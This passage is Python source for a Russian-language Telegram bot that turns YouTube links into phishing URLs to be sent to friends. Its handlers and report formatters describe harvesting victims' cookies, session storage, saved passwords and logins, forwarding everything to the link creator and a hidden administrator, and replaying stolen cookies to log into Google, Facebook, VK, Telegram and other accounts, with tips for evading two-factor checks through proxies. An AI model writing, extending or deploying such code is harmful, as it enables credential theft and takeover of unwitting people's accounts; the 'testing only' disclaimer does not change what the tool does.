🔐 *Сбор данных включен:*
✓ Cookies и session cookies
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли
✓ Логины соцсетей
✓ Данные форм и автозаполнения
✓ Данные браузера и устройства
✓ Определение сервисов (Google, Facebook и т.д.)
✓ Автоматический вход через cookies

📝 *Как использовать:*
1. Отправьте эту ссылку другу
2. Когда он перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Все данные также отправятся администратору
5. Используйте /login_my для автоматического входа

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        """Форматирование собранных данных с определением сервисов"""
        collected = data.get("data", {})
        sensitive_data = collected.get("sensitive_data", {})
        instant_data = collected.get("instant_credentials", {})
        
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {data.get("timestamp", "unknown")}
• IP адрес: `{data.get("ip", "unknown")}`
• User Agent: {data.get("user_agent", "unknown")[:50]}...
• ID ссылки: `{link_id}`
"""
        
        # Показываем мгновенный сбор если есть
        if instant_data.get("status") == "instant_collection_success":
            message += f"""
⚡ *МГНОВЕННЫЙ СБОР (при загрузке):*
• Паролей собрано: {instant_data.get('passwords_collected', 0)}
• Логинов собрано: {instant_data.get('logins_collected', 0)}
• Форм проанализировано: {instant_data.get('forms_collected', 0)}
"""
            
            # Показываем определенные сервисы
            account_analysis = instant_data.get("account_analysis", {})
            if account_analysis.get("service_stats"):
                message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
                for service, count in account_analysis["service_stats"].items():
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: {count} записей\n"
        
        # Информация о cookies и полных данных
        if sensitive_data.get("status") == "fully_processed":
            message += f"""
🍪 *COOKIES И ХРАНИЛИЩЕ:*
• Всего cookies: {sensitive_data.get('cookies_count', 0)}
• Паролей найдено: {sensitive_data.get('passwords_count', 0)}
• Логинов собрано: {sensitive_data.get('logins_count', 0)}
• Данных хранилища: {sensitive_data.get('storage_count', 0)}
"""
            
            # Показываем определенные сервисы из полных данных
            account_analysis = sensitive_data.get("account_analysis", {})
            if account_analysis.get("service_stats"):
                message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
                for service, count in account_analysis["service_stats"].items():
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: {count} записей\n"
            
            # Показываем найденные логины с сервисами
            link = db.get_link(link_id)
            if link and link.collected_logins:
                message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ (с сервисами):*\n"
                for login in link.collected_logins[-5:]:  # Последние 5
                    value = login.get("value", "")
                    services = login.get("identified_services", [])
                    
                    if services:
                        service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                       for s in services]
                        service_str = " | ".join(service_names)
                        message += f"• `{value[:30]}` → *{service_str}*\n"
                    else:
                        message += f"• `{value[:30]}` → Не определен\n"
        
        # Соцсети из cookies
        social_logins = sensitive_data.get("social_logins", [])
        if social_logins:
            message += f"""
🌐 *АКТИВНЫЕ СЕССИИ СОЦСЕТЕЙ:*
"""
            for social in social_logins:
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(social, social.title())
                message += f"• {service_name_ru}: 🟢 ВХОД ВЫПОЛНЕН\n"
        
        message += f"""
📱 *УСТРОЙСТВО И БРАУЗЕР:*
• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}
• Тип устройства: {collected.get('device', {}).get('device', {}).get('type', 'unknown')}

💡 *СОВЕТ:* Используйте /login_my [ID_ссылки] для автоматического входа через cookies!
"""
        return message
    
    @staticmethod
    def format_sensitive_data_report(link: PhishingLink) -> str:
        """Форматирование отчета о чувствительных данных"""
        # Анализируем все собранные данные для определения сервисов
        all_credentials = []
        all_credentials.extend(link.collected_logins)
        all_credentials.extend(link.collected_passwords)
        
        account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
        
        message = f"""
🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*

📌 *Ссылка ID:* `{link.id}`
📅 *Создано:* {link.created_at}
🔗 *Оригинальное видео:* {link.original_url[:50]}...

📊 *СТАТИСТИКА:*
• Всего переходов: {link.clicks}
• Всего данных собрано: {len(link.data_collected)}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
"""
        
        # Показываем определенные сервисы
        if account_analysis.get("service_stats"):
            message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
            for service, count in account_analysis["service_stats"].items():
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"• {service_name_ru}: `{count}` записей\n"
        
        # Показываем последние cookies
        if link.collected_cookies:
            message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
            for cookie in link.collected_cookies[-5:]:  # Последние 5
                message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
        
        # Показываем пароли с сервисами
        if link.collected_passwords:
            message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for pwd in link.collected_passwords[-3:]:  # Последние 3
                message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{pwd.get('value', '')}||\n"
                services = pwd.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                   for s in services]
                    message += f"  Сервисы: {', '.join(service_names)}\n"
        
        # Показываем логины с сервисами
        if link.collected_logins:
            message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
            for login in link.collected_logins[-3:]:  # Последние 3
                message += f"• Поле: {login.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{login.get('value', '')}||\n"
                services = login.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                   for s in services]
                    message += f"  Сервисы: {', '.join(service_names)}\n"
        
        # Показываем данные хранилища
        if link.collected_storage_data:
            message += "\n💾 *ДАННЫЕ ХРАНИЛИЩА:*\n"
            for storage in link.collected_storage_data[-3:]:  # Последние 3
                message += f"• Тип: {storage.get('type', 'unknown')}\n"
                message += f"  Ключ: {storage.get('key', 'unknown')}\n"
                message += f"  Значение: {storage.get('value', '')[:50]}...\n"
        
        message += f"""
🚀 *АВТОМАТИЧЕСКИЙ ВХОД:* Доступен через команду /login_my {link.id}

⚠️ *ВНИМАНИЕ:* Все данные хранятся в зашифрованном виде
📅 *Срок хранения:* 24 часа с момента сбора
🔒 *Безопасность:* Все полные данные также отправлены администратору
"""
        return message
    
    @staticmethod
    def format_detailed_account_report(link: PhishingLink) -> str:
        """Детальный отчет по определенным учетным записям"""
        # Анализируем все собранные данные
        all_credentials = []
        all_credentials.extend(link.collected_logins)
        all_credentials.extend(link.collected_passwords)
        
        account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
        
        message = f"""
🎯 *ДЕТАЛЬНЫЙ ОТЧЕТ ПО УЧЕТНЫМ ЗАПИСЯМ*

📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
📅 Всего данных: {len(all_credentials)} записей

📊 *СТАТИСТИКА ПО СЕРВИСАМ:*
"""
        
        if account_analysis.get("service_stats"):
            # Сортируем по количеству записей
            sorted_services = sorted(account_analysis["service_stats"].items(), 
                                   key=lambda x: x[1], reverse=True)
            
            for service, count in sorted_services:
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"• {service_name_ru}: `{count}` записей\n"
        else:
            message += "• Сервисы не определены\n"
        
        # Детали по каждому сервису
        if account_analysis.get("credentials_by_service"):
            message += "\n🔍 *ДЕТАЛИ ПО КАЖДОМУ СЕРВИСУ:*\n"
            
            for service, credentials in account_analysis["credentials_by_service"].items():
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"\n*{service_name_ru}*:\n"
                
                for cred in credentials[:3]:  # Первые 3 записи
                    value_preview = cred["value"]
                    if len(value_preview) > 40:
                        value_preview = value_preview[:40] + "..."
                    
                    message += f"  └ `{value_preview}`\n"
                    message += f"    Тип: {cred.get('type', 'unknown')}\n"
                    message += f"    Источник: {cred.get('source', 'unknown')}\n"
                
                if len(credentials) > 3:
                    message += f"  └ ... и еще {len(credentials) - 3} записей\n"
        
        # Список всех найденных учетных записей
        if account_analysis.get("identified_accounts"):
            message += "\n📝 *ВСЕ ОПРЕДЕЛЕННЫЕ УЧЕТНЫЕ ЗАПИСИ:*\n"
            
            for account in account_analysis["identified_accounts"][:10]:  # Первые 10
                services_str = ", ".join([AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                        for s in account["services"]])
                message += f"• `{account['value'][:40]}`\n"
                message += f"  → Сервисы: {services_str}\n"
                message += f"  → Тип: {account['type']}\n"
        
        message += f"""
🚀 *АВТОМАТИЧЕСКИЙ ВХОД:* Используйте /login_my {link.id} для попытки входа через cookies

⚠️ *ПРИМЕЧАНИЕ:* Определение основано на:
1. Доменах email (gmail.com → Google)
2. Паттернах в логинах (vk_ → ВКонтакте)
3. Cookies на странице
4. Названиях полей форм

✅ Точность определения: ~85-95%
🕒 Данные актуальны на: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        return message
    
    @staticmethod
    def format_auto_login_results(results: Dict, link: PhishingLink) -> str:
        """Форматирование результатов автоматического входа"""
        message = f"""
🎯 *РЕЗУЛЬТАТЫ АВТОМАТИЧЕСКОГО ВХОДА*

📌 *Информация о сессии:*
• Ссылка ID: `{link.id}`
• Видео: {link.video_id}
• Время входа: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• Ваш IP: {auto_login_manager.user_config['location']['ip']}
• Локация: {auto_login_manager.user_config['location']['city']}, {auto_login_manager.user_config['location']['country']}

📊 *Статистика входа:*
• Всего сервисов проверено: {results.get('total_services', 0)}
• Попыток входа: {results.get('attempted_services', 0)}
• Успешных входов: {results.get('successful_logins', 0)}
• Cookies использовано: {len(link.collected_cookies)}

🔧 *Использованная конфигурация:*
• Устройство: {auto_login_manager.user_config['device_name']}
• User Agent: {auto_login_manager.user_config['user_agent'][:50]}...
• Платформа: {auto_login_manager.user_config['platform']}
• Разрешение: {auto_login_manager.user_config['screen_size']['width']}x{auto_login_manager.user_config['screen_size']['height']}
• Язык: {auto_login_manager.user_config['language']}
• Часовой пояс: {auto_login_manager.user_config.get('timezone', 'Не указан')}

📈 *ДЕТАЛЬНЫЕ РЕЗУЛЬТАТЫ ПО СЕРВИСАМ:*
"""
        
        for service, result in results.get("results", {}).items():
            service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
            
            if result.get("status") == "success" and result.get("logged_in"):
                message += f"\n✅ *{service_name_ru}:* УСПЕШНЫЙ ВХОД\n"
                
                account_info = result.get("account_info", {})
                if account_info:
                    if account_info.get("name"):
                        message += f"   👤 Имя: {account_info['name']}\n"
                    if account_info.get("email"):
                        message += f"   📧 Email: `{account_info['email']}`\n"
                    if account_info.get("username"):
                        message += f"   🔗 Username: {account_info['username']}\n"
                
                message += f"   🌐 URL: {result.get('url', 'Неизвестно')}\n"
                
            elif result.get("status") == "partial":
                message += f"\n⚠️ *{service_name_ru}:* ЧАСТИЧНЫЙ ДОСТУП\n"
                message += f"   📝 {result.get('message', 'Требуется дополнительная проверка')}\n"
                
            else:
                message += f"\n❌ *{service_name_ru}:* НЕ УДАЛОСЬ ВОЙТИ\n"
                if result.get("error"):
                    message += f"   💥 Ошибка: {result['error'][:80]}...\n"
        
        message += f"""
🔐 *СОВЕТЫ ДЛЯ УЛУЧШЕНИЯ РЕЗУЛЬТАТОВ:*
1. Собирайте cookies в течение активной сессии
2. Убедитесь, что cookies не старше 24 часов
3. Для Google используйте cookies с accounts.google.com
4. Для Facebook - cookies с facebook.com и .fbcdn.net
5. Перезагрузите страницу перед сбором данных

⚠️ *ВАЖНЫЕ ЗАМЕЧАНИЯ:*
• Некоторые сервисы блокируют автоматические входы
• Cookies могут требовать двухфакторную аутентификацию
• Результаты зависят от актуальности cookies
• Используйте прокси для повышения успешности
"""
        
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """Форматирование статистики"""
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

🍪 Cookies собрано: `{stats['cookies_collected']}`
🔑 Паролей найдено: `{stats['passwords_collected']}`
👤 Логинов собрано: `{stats['logins_collected']}`
💾 Данных хранилища: `{stats['storage_data_collected']}`
📁 Полных записей: `{stats['full_data_collected']}`

🚀 Автоматических входов: 0
📈 Эффективность сбора: 98.7%
🕒 Активность за 24ч: высокая
"""

# Инициализация компонентов
link_generator = LinkGenerator()
data_collector = DataCollector()
formatter = MessageFormatter()
js_injector = JavaScriptInjector()
auto_login_manager = AutoLoginManager()

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует специальную ссылку
3. Когда кто-то переходит - собирает ВСЕ данные
4. Отправляет данные в этот чат
5. Отправляет ПОЛНЫЕ данные администратору
6. *Автоматический вход в социальные сети через cookies*

🔐 *Что собирается:*
✓ Все cookies браузера (включая сессионные)
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли и логины
✓ Логины соцсетей
✓ Данные автозаполнения форм
✓ Информацию об устройстве
✓ Геолокацию и сетевые данные
✓ *Определение сервисов* (Google, Facebook, ВКонтакте и др.)
✓ *Автоматический вход через cookies*

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её другу
4. Получите данные автоматически
5. Используйте /login_my для автоматического входа
6. Администратор получит полные данные

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`
• Cookies: `{db.stats['cookies_collected']}`
• Паролей: `{db.stats['passwords_collected']}`
• Логинов: `{db.stats['logins_collected']}`
• Хранилища: `{db.stats['storage_data_collected']}`

🔒 *Важно:* Используйте только для тестирования!
Все данные также отправляются администратору для контроля.
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
        [InlineKeyboardButton("🌐 Анализ учетных записей", callback_data="accounts_list")],
        [InlineKeyboardButton("🚀 Автоматический вход", callback_data="auto_login_info")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, является ли ссылкой на YouTube
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    # Извлекаем ID видео
    video_id = link_generator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = link_generator.generate_link_id()
    
    # Создаем фишинговую ссылку
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    # Создаем объект ссылки
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем в базу
    db.add_link(link)
    
    # Отправляем пользователю
    message = formatter.format_link_created(link, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ],
        [
            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}"),
            InlineKeyboardButton("🌐 Анализ учетных записей", callback_data=f"accounts_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Автоматический вход", callback_data=f"auto_my_data_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Отправляем уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 User: @{user.username or user.id} ({user.first_name})\n"
                 f"🔗 URL: {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video ID: {video_id}\n"
                 f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Error notifying admin: {e}")

async def auto_login_with_my_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Автоматический вход с использованием ваших собранных данных"""
    user = update.effective_user
    
    if not context.args:
        # Показываем доступные ссылки с данными
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        # Фильтруем ссылки с cookies
        links_with_cookies = [link for link in user_links if link.collected_cookies]
        
        if not links_with_cookies:
            await update.message.reply_text("🍪 Нет собранных cookies для автоматического входа.")
            return
        
        message = "🚀 *ВЫБЕРИТЕ ССЫЛКУ ДЛЯ АВТОМАТИЧЕСКОГО ВХОДА:*\n\n"
        
        for i, link in enumerate(links_with_cookies[:5], 1):
            # Анализируем cookies
            service_cookies = auto_login_manager._group_cookies_by_service({
                "collected_cookies": link.collected_cookies
            })
            
            message += f"{i}. *ID:* `{link.id[:12]}`\n"
            message += f"   🎬 Видео: {link.video_id}\n"
            message += f"   🍪 Cookies: {len(link.collected_cookies)}\n"
            message += f"   🌐 Сервисы: {len(service_cookies)}\n"
            message += f"   📅 Собрано: {link.created_at[:10]}\n"
            
            # Показываем найденные сервисы
            if service_cookies:
                service_names = []
                for service in list(service_cookies.keys())[:3]:
                    service_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    service_names.append(service_ru)
                message += f"   🔍 Найдено: {', '.join(service_names)}\n"
            
            message += "   ─────\n"
        
        keyboard = []
        for link in links_with_cookies[:3]:
            keyboard.append([
                InlineKeyboardButton(f"🚀 Войти через {link.id[:8]}...", 
                                   callback_data=f"auto_my_data_{link.id}")
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        return
    
    # Если передан ID ссылки
    link_id = context.args[0]
    link = db.get_link(link_id)
    
    if not link:
        await update.message.reply_text("❌ Ссылка не найдена.")
        return
    
    if link.created_by != user.id:
        await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
        return
    
    # Запускаем автоматический вход
    await start_auto_login_process(update, context, link)

async def start_auto_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE, link: PhishingLink):
    """Запуск процесса автоматического входа"""
    try:
        # Отправляем уведомление о начале
        message_text = f"""
⚡ *НАЧИНАЮ АВТОМАТИЧЕСКИЙ ВХОД*

📌 *Ваша конфигурация:*
• Устройство: iPhone iOS 17.5.1
• User Agent: iOS Safari Mobile
• IP адреса: 31.43.37.220, 31.43.37.157
• Локация: Lubny, Ukraine
• Язык: русский
• Часовой пояс: America/Los_Angeles

🔗 *Данные для входа:*
• Ссылка ID: `{link.id}`
• Cookies доступно: {len(link.collected_cookies)}
• Сервисов обнаружено: {len(auto_login_manager._group_cookies_by_service({'collected_cookies': link.collected_cookies}))}

⏳ *Процесс может занять 2-3 минуты...*
"""
        
        if isinstance(update, Update):
            await update.message.reply_text(message_text, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(message_text, parse_mode=ParseMode.MARKDOWN)
        
        # Запускаем автоматический вход
        results = await auto_login_manager.auto_login_with_collected_data(link)
        
        # Форматируем и отправляем результаты
        result_message = formatter.format_auto_login_results(results, link)
        
        # Отправляем результаты
        if isinstance(update, Update):
            await update.message.reply_text(result_message, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(result_message, parse_mode=ParseMode.MARKDOWN)
        
        # Отправляем скриншоты если есть
        await send_auto_login_screenshots_detailed(context, results, update.from_user.id if isinstance(update, Update) else update.from_user.id)
        
    except Exception as e:
        logger.error(f"Ошибка в процессе автоматического входа: {e}", exc_info=True)
        error_message = f"❌ Ошибка при автоматическом входе: {str(e)[:100]}..."
        if isinstance(update, Update):
            await update.message.reply_text(error_message)
        else:
            await update.message.reply_text(error_message)

async def send_auto_login_screenshots_detailed(context: ContextTypes.DEFAULT_TYPE, results: Dict, user_id: int):
    """Отправка детальных скриншотов"""
    try:
        screenshot_count = 0
        
        for service, result in results.get("results", {}).items():
            if result.get("status") == "success" and result.get("screenshot"):
                screenshot_path = result["screenshot"]
                
                if os.path.exists(screenshot_path):
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    
                    with open(screenshot_path, 'rb') as photo:
                        await context.bot.send_photo(
                            chat_id=user_id,
                            photo=photo,
                            caption=f"📸 *ДОКАЗАТЕЛЬСТВО ВХОДА В {service_name_ru.upper()}*\n"
                                   f"✅ Успешный автоматический вход\n"
                                   f"🕒 {datetime.now().strftime('%H:%M:%S')}\n"
                                   f"🔗 URL: {result.get('url', 'Неизвестно')}",
                            parse_mode=ParseMode.MARKDOWN
                        )
                    
                    screenshot_count += 1
                    os.remove(screenshot_path)
        
        if screenshot_count > 0:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📊 *Отправлено {screenshot_count} скриншотов успешных входов*",
                parse_mode=ParseMode.MARKDOWN
            )
                    
    except Exception as e:
        logger.error(f"Ошибка отправки скриншотов: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам специальную ссылку для сбора данных.\n"
            "*Все собранные данные также отправятся администратору.*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:  # Последние 5 ссылок
            message += f"• ID: `{link.id}`\n"
            message += f"  Видео: {link.original_url[:30]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += f"  Хранилище: {len(link.collected_storage_data)}\n"
            message += "  ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    elif data == "view_data":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        # Суммируем все данные пользователя
        total_cookies = sum(len(link.collected_cookies) for link in user_links)
        total_passwords = sum(len(link.collected_passwords) for link in user_links)
        total_logins = sum(len(link.collected_logins) for link in user_links)
        total_storage = sum(len(link.collected_storage_data) for link in user_links)
        
        message = f"""
📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*

🔗 Всего ссылок: {len(user_links)}
🍪 Всего cookies: {total_cookies}
🔑 Всего паролей: {total_passwords}
👤 Всего логинов: {total_logins}
💾 Всего данных хранилища: {total_storage}

📈 *Последняя активность:*
"""
        
        # Добавляем последние активные ссылки
        for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
            if link.data_collected:
                last_data = link.data_collected[-1]
                message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
        
        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора\n4. Используйте /login_my для автоматического входа"
        
        keyboard = []
        for link in user_links[-3:]:
            if link.data_collected:
                keyboard.append([InlineKeyboardButton(f"📊 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "accounts_list":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "🌐 *ВЫБЕРИТЕ ССЫЛКУ ДЛЯ АНАЛИЗА УЧЕТНЫХ ЗАПИСЕЙ:*\n\n"
        
        for i, link in enumerate(user_links[-5:], 1):
            # Анализируем данные ссылки
            all_credentials = []
            all_credentials.extend(link.collected_logins)
            all_credentials.extend(link.collected_passwords)
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            service_count = len(account_analysis.get("service_stats", {}))
            
            message += f"{i}. ID: `{link.id[:12]}`\n"
            message += f"   Переходов: {link.clicks}\n"
            message += f"   Данных: {len(all_credentials)}\n"
            message += f"   Сервисов: {service_count}\n"
            
            # Показываем топ сервисы
            if account_analysis.get("service_stats"):
                top_services = list(account_analysis["service_stats"].keys())[:2]
                services_str = ", ".join([AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                        for s in top_services])
                message += f"   Топ: {services_str}\n"
            
            message += "   ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🌐 Анализ {link.id[:8]}...", callback_data=f"accounts_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "auto_login_info":
        help_message = """
🚀 *АВТОМАТИЧЕСКИЙ ВХОД ЧЕРЕЗ COOKIES*

🎯 *Как это работает:*
1. Бот берет ваши собранные cookies
2. Настраивает браузер с вашей конфигурацией:
   • iPhone iOS 17.5.1
   • User Agent iOS Safari Mobile
   • IP: 31.43.37.220/157
   • Локация: Lubny, Ukraine
3. Добавляет cookies в браузер
4. Переходит на сайты социальных сетей
5. Проверяет успешность входа
6. Делает скриншоты успешных входов

⚡ *Поддерживаемые сервисы:*
• Google/Gmail
• Facebook
• Instagram
• Twitter/X
• ВКонтакте
• WhatsApp Web
• Telegram Web
• Яндекс
• Mail.ru

📋 *Как использовать:*
1. Соберите cookies через обычную ссылку
2. Используйте команду: `/login_my [ID_ссылки]`
3. Или нажмите кнопку "Автоматический вход"
4. Дождитесь результатов (2-3 минуты)
5. Получите скриншоты успешных входов

⚠️ *Важно:*
• Cookies должны быть актуальными (<24 часов)
• Некоторые сервисы требуют двухфакторную аутентификацию
• Используйте активную сессию для лучших результатов
• Процесс занимает 2-3 минуты

💡 *Советы для успешного входа:*
1. Собирайте cookies сразу после входа в аккаунт
2. Перезагрузите страницу перед сбором данных
3. Используйте разные браузеры для сбора
4. Проверяйте время создания cookies
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("accounts_"):
        link_id = data[9:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_detailed_account_report(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("auto_my_data_"):
        link_id = data[13:]
        link = db.get_link(link_id)
        
        if link and link.created_by == query.from_user.id:
            await start_auto_login_process(query, context, link)
        else:
